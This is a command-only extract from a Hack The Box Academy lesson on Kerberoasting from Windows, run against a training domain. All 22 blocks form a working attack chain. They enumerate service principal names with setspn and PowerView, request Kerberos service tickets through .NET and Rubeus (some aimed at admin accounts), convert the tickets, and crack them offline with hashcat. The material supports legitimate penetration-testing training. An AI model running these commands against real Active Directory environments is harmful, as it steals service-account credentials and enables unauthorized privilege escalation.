# Section 18: Kerberoasting - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1423
- Code/command blocks: 22

> Terminal output is omitted; only commands & scripts are captured.

## 1. `cmd` _(output omitted)_

```cmd
setspn.exe -Q */*
```

## 2. `powershell` _(output omitted)_

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

## 3. `powershell` _(output omitted)_

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## 4. `shellsession` _(output omitted)_

```bash
echo "<base64 blob>" |  tr -d \\n 
```

## 5. `shellsession`

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

## 6. `shellsession`

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

## 7. `shellsession`

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

## 8. `shellsession` _(output omitted)_

```bash
cat sqldev_tgs_hashcat 
```

## 9. `shellsession` _(output omitted)_

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

## 10. `powershell` _(output omitted)_

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

## 11. `powershell` _(output omitted)_

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

## 12. `powershell`

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

## 13. `powershell` _(output omitted)_

```powershell
cat .\ilfreight_tgs.csv
```

## 14. `powershell` _(output omitted)_

```powershell
.\Rubeus.exe
```

## 15. `powershell` _(output omitted)_

```powershell
.\Rubeus.exe kerberoast /stats
```

## 16. `powershell` _(output omitted)_

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## 17. `powershell` _(output omitted)_

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

## 18. `powershell` _(output omitted)_

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

## 19. `shellsession` _(output omitted)_

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

## 20. `powershell` _(output omitted)_

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

## 21. `powershell` _(output omitted)_

```powershell
 .\Rubeus.exe kerberoast /user:testspn /nowrap
```

## 22. `shellsession` _(output omitted)_

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

